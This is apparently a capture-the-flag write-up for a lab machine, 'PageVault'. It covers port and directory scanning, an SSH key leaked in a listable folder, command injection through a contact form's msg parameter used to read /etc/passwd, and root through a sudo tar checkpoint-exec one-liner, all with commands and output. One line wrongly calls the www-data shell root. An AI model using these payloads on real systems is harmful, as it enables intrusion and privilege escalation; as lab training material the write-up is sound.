# **PageVault - ThunderCipher**

*Target Ip. Address: 192.168.5.213*

So, let's begin with the nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.213
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 14:07 IST
Nmap scan report for 192.168.5.213
Host is up (0.00027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 58:c7:41:8d:4b:32:ef:6a:12:a7:3c:79:53:e2:9b:91 (ECDSA)
|_  256 70:0b:91:c6:b3:95:7c:00:44:c5:0d:89:3a:cb:8f:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: PageVault Books
MAC Address: BC:24:11:C7:A9:B0 (Proxmox Server Solutions GmbH)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 80 (http).

Nothing interesting on website. Let's find some directories.

```bash
kali@kali:dirb http://192.168.5.213

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 11 14:08:09 2026
URL_BASE: http://192.168.5.213/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.5.213/ ----
==> DIRECTORY: http://192.168.5.213/assets/                                                                        
+ http://192.168.5.213/index.php (CODE:200|SIZE:952)                                                               
+ http://192.168.5.213/server-status (CODE:403|SIZE:278)                                                           
                                                                                                                   
---- Entering directory: http://192.168.5.213/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Feb 11 14:08:09 2026
DOWNLOADED: 4612 - FOUND: 2
```

So, we have assets. Let's see if we have anything there.

We find ssh key in one of the text file there.

```bash
kali@kali:chmod 600 id_rsa
```

Since, we have no username for right now, let's search for username for now.

The contach page (contact.php is slightly interesting. Let's intercept the request and see what it looks like.

```request
GET /contact.php?name=test&msg=hello HTTP/1.1
Host: 192.168.5.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.5.213/contact.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

It has ?name=xx&msg=xx. This can be tested for LFI, command injection, SQLi, and many more.

Before trying manually, let's do some automated scan. Save the request we intercepted.

```bash
kali@kali:commix -r /home/kali/1.txt
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.1
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright © 2014-2025 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
                                                                                                                                       
[14:36:41] [info] Parsing HTTP request using the '1.txt' file.                                                                         
[14:36:41] [info] Testing connection to the target URL.                                                                                
Custom injection marker ('*') found in option '--header(s)/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n] > y      
[14:36:44] [info] Checking whether the target is protected by some kind of WAF/IPS.                                                    
[14:36:44] [info] Performing heuristic (passive) tests on the target URL.                                                              
Other non-custom parameters found. Do you want to process them too? [Y/n] > y                                                          
[14:36:54] [info] Setting GET parameter 'name' for tests.                                                                              
[14:36:54] [info] Performing heuristic (basic) tests to the GET parameter 'name'.                                                      
[14:37:05] [warning] Heuristic (basic) tests show that GET parameter 'name' might not be injectable.                                   
[14:37:19] [info] Testing the (results-based) classic command injection technique.                                                     
[14:37:37] [info] Testing the (results-based) dynamic code evaluation technique.                                                       
[14:37:37] [warning] It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.
[14:37:58] [info] Checking if the injection point on GET parameter 'name' is a false positive.
[14:38:09] [info] Testing the (blind) time-based command injection technique.           t........................
Enter a writable directory to use for file operations (e.g. '/var/www/html/') > y
[14:39:38] [info] Attempting to create a file in directory 'y' for command execution output. 
Do you want to use a random file 'JJRZLL.txt' to receive the command execution output? [Y/n] > y
Do you want to use the URL 'http://192.168.5.213/JJRZLL.txt' to receive the command execution output? [Y/n] > y
Insufficient permissions on directory 'y/'. Do you want to use '/tmp/' instead? [Y/n] > y8%)
[14:40:04] [info] Attempting to create a file in directory '/tmp/' for command execution output. 
[14:40:24] [info] Testing the (semi-blind) tempfile-based injection technique.           
[14:40:28] [info] Testing the (semi-blind) file-based command injection technique.           
[14:40:28] [warning] GET parameter 'name' does not seem to be injectable.
[14:40:28] [info] Setting GET parameter 'msg' for tests.
[14:40:28] [info] Performing heuristic (basic) tests to the GET parameter 'msg'.
[14:40:29] [info] Heuristic (basic) tests show that GET parameter 'msg' might be injectable (possible OS: 'Unix-like').
[14:40:31] [info] Testing the (results-based) classic command injection technique.           
[14:40:31] [info] GET parameter 'msg' appears to be injectable via (results-based) classic command injection technique.
           |_ f;echo TQKBOV$((22+2))$(echo TQKBOV)TQKBOV
GET parameter 'msg' is likely vulnerable. Do you want to spawn a pseudo-terminal shell? [Y/n] > y
Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) > help
```

Running commix, which scan for command injection vulnerabilities, we find msg parameter is vulnerable, but we are not able to exectue code.

We will have to do it manually.

```request
GET /contact.php?name=test&msg=hello;id HTTP/1.1
Host: 192.168.5.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.5.213/contact.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```response
HTTP/1.1 200 OK
Date: Wed, 11 Feb 2026 08:58:47 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 855
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Contact Us - PageVault Books</title>
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
    <header>
        <h1>PageVault Books</h1>
    </header>
    <nav>
        <a href="index.php">Home</a>
        <a href="books.php">Books</a>
        <a href="contact.php">Contact Us</a>
    </nav>
    <main>
        <h2>Contact Support</h2>
        <form method="GET">
            Your Name: <input type="text" name="name" placeholder="John Doe" required>
            Message: <textarea name="msg" rows="4" placeholder="Your message here..." required></textarea>
            <input type="submit" value="Send Message">
        </form>
    </main>
<h3>Processing your message...</h3><pre>hello
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
</body>
</html>
```

We have our command (id) executed and we are root.
Since, we already have ssh-key, we can just find a valid user with bash.
Also, don't forget to URL-encode.

```request
GET /contact.php?name=test&msg=%68%65%6c%6c%6f%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1
Host: 192.168.5.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.5.213/contact.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```response
HTTP/1.1 200 OK
Date: Wed, 11 Feb 2026 09:01:52 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2326
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Contact Us - PageVault Books</title>
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
    <header>
        <h1>PageVault Books</h1>
    </header>
    <nav>
        <a href="index.php">Home</a>
        <a href="books.php">Books</a>
        <a href="contact.php">Contact Us</a>
    </nav>
    <main>
        <h2>Contact Support</h2>
        <form method="GET">
            Your Name: <input type="text" name="name" placeholder="John Doe" required>
            Message: <textarea name="msg" rows="4" placeholder="Your message here..." required></textarea>
            <input type="submit" value="Send Message">
        </form>
    </main>
<h3>Processing your message...</h3><pre>hello
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
syslog:x:101:103::/home/syslog:/usr/sbin/nologin
postfix:x:102:109::/var/spool/postfix:/usr/sbin/nologin
_apt:x:103:65534::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
systemd-network:x:105:113:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:106:114:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:107:115:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
uuidd:x:108:116::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
bookadmin:x:1000:1000::/home/bookadmin:/bin/bash
</pre>
</body>
</html>
```

We have a user "bookadmin" with bash. Let's login via ssh with the key.

```bash
kali@kali:ssh -i id_rsa bookadmin@192.168.5.213
The authenticity of host '192.168.5.213 (192.168.5.213)' can't be established.
ED25519 key fingerprint is: SHA256:WzpiA6POZWSyMqOlr8xxpuxMMEE48ApMI3mudSUrwDA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.5.213' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04 LTS (GNU/Linux 6.17.4-2-pve x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Wed May 28 18:07:30 2025 from 192.168.1.4
bookadmin@manbahadurthapa46467108:~$
```

We are in. The user flag is located at the home directory.

```bash
bookadmin@manbahadurthapa46467108:~$ cat user.txt
ThunderCipher{us.....17}
```

Let's see if we have sudo privileges.

```bash
bookadmin@manbahadurthapa46467108:~$ sudo -l
Matching Defaults entries for bookadmin on manbahadurthapa46467108:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,use_pty

User bookadmin may run the following commands on manbahadurthapa46467108:
    (ALL) NOPASSWD: /bin/tar
```

We can run /bin/tar as root. Quick look at "*https://gtfobins.org/gtfobins/tar/*", we have privilege escalation.

```bash
bookadmin@manbahadurthapa46467108:~$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```

Now we are root. Read the final flag at root directory and end this challenge.

```bash
# cat root.txt
ThunderCipher{0n1r1c_R007_w0rmh0le_XY92}
```
